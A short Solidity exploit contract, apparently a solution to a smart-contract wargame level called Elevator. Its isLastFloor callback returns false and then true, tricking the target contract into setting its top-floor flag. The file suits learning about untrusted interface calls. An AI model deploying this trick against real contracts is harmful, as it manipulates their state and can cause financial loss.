// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import {IElevator} from "src/hack/interfaces/IElevator.sol";
import {IBuilding} from "src/hack/interfaces/IBuilding.sol";

contract ElevatorHack is IBuilding {
    uint256 count;

    function hack(address _elevator) external {
        IElevator elevator = IElevator(_elevator);
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (count > 0) return true;
        else {
            count++;
            return false;
        }
    }
}
